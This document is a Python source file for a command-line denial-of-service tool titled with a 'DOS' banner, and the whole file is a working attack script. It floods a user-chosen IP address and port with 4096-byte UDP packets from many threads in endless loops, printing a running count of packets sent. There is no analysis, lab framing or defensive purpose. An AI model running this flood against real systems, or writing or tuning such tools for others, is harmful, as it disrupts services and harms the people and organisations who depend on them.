import socket
import threading
import sys
import time


banner = """

        ██████╗  ██████╗ ███████╗
        ██╔══██╗██╔═══██╗██╔════╝
        ██║  ██║██║   ██║███████╗
        ██║  ██║██║   ██║╚════██║
        ██████╔╝╚██████╔╝███████║
        ╚═════╝  ╚═════╝ ╚══════╝
"""


def PrintNetworkInformation():
    hostname = socket.gethostname()
    print(f"Hostname: {hostname}")

    ip_list = socket.gethostbyname_ex(hostname)
    ip_addresses = ip_list[2]
    
    print("IP Addresses:")
    for ip in ip_addresses:
        print(ip)


Attack_num = 0


def send_packets(socket, target_ip, target_port):
    buffer = bytearray(4096)
    socket.sendto(buffer, (target_ip, target_port))

def send_multiple_packets(thread_num, target_ip, target_port):
    sent = 0
    threads = []

    def send_packets_in_thread():
        nonlocal sent
        while True:
            sent += 1
            send_packets(udp_socket, target_ip, target_port)
            sys.stdout.write(f"[!] PACKETS SENT [{sent}]\r")

    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print("[!] Exit the app to stop...\n")

    for _ in range(thread_num):
        thread = threading.Thread(target=send_packets_in_thread)
        thread.start()
        threads.append(thread)

    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("\n[!] Attack stopped.")
        sys.exit(0)


if __name__ == "__main__":
    args = sys.argv
    if len(args) < 2 or args[1] == "-h" or args[1] == "--help":
        print("Usage: python dos.py [options]")
        print("Options:")
        print(" -i       Print hostname and IP Address.")
        print(" -t       Threads number.")
        print(" -ip      IP Address to dos.")
        print(" -p       Port to dos.")
    else:
        printIP = False
        Threads = 10
        AddressIP = "127.0.0.1"
        Port = 80

        for i in range(1, len(args)):
            if args[i] == "-i":
                printIP = True

            if args[i] == "-t" and i < len(args) - 1:
                Threads = int(args[i + 1])

            if args[i] == "-ip" and i < len(args) - 1:
                AddressIP = args[i + 1]

            if args[i] == "-p" and i < len(args) - 1:
                Port = int(args[i + 1])

        if printIP:
            PrintNetworkInformation()

        print(banner)
        print("=====================INFORMATION=======================\n")
        print(f"   IP                 => {AddressIP}")
        print(f"   PORT               => {Port}")
        print(f"   Threads            => {Threads}")
        print("\n=======================================================")
        print("Launching...")
        time.sleep(1)

        send_multiple_packets(Threads, AddressIP, Port)
